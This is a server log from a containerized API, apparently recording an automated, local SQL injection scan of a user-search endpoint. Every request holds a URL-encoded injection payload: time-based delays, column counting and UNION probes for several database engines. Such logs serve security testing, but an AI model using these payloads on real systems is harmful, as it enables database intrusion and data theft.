api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7389%3D%28SELECT%2F%2A%2A%2F7389%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287600%3D7600 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7389%3D%28SELECT%2F%2A%2A%2F7389%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7389%3D%28SELECT%2F%2A%2A%2F7389%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FYOYz HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27TpZR%27%3D%27TpZR HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27lfgj%27%3D%27lfgj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%282392%3D2392 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FtWEj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5454%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2879%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27rYTH%27%3D%27rYTH HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5454%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2879%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27tutC%27%3D%27tutC HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5454%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2879%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289007%3D9007 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5454%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2879%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5454%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%28102%29%7C%7CCHR%2876%29%7C%7CCHR%2879%29%2C5%29--%2F%2A%2A%2FqUwz HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FTFMP HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FeQMU HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6242--%2F%2A%2A%2FuPyp HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F10--%2F%2A%2A%2FkNgc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6--%2F%2A%2A%2FOxkj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4--%2F%2A%2A%2FukFD HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5--%2F%2A%2A%2FNFXf HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%27ijOWaMxKXSoFVuZKjVRwCjbzqFfopmszYpOlcOdr%27%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FideB HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%27ijOWaMxKXSoFVuZKjVRwCjbzqFfopmszYpOlcOdr%27%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%27NAIOdbVbtoXiXYVUBjdzfOLaRchlhAbBGoEzIuBL%27%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FrMnI HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%27ijOWaMxKXSoFVuZKjVRwCjbzqFfopmszYpOlcOdr%27%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F0%2F%2A%2A%2FAS%2F%2A%2A%2FYqui%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F10%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F11%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F12%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F13%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F14%29%2F%2A%2A%2FAS%2F%2A%2A%2FLYsD--%2F%2A%2A%2FUYkr HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2831%3D31%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FdInJ HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2831%3D39%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FWVnq HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2831%3D60%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FmvDj HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2860%3D39%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FVfQu HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2839%3D39%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FhNHc HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2860%2F%2A%2A%2F39%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FBupm HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qjqpq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285005%3D%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F5005%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FEyFe HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%280x716a717071%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x716a717871%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2F- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCONCAT%280x716a717071%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x716a717871%29%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2F- HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LENGTH%28SYSDATE%29%3DLENGTH%28SYSDATE%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--%2F%2A%2A%2FkPTJ HTTP/1.1
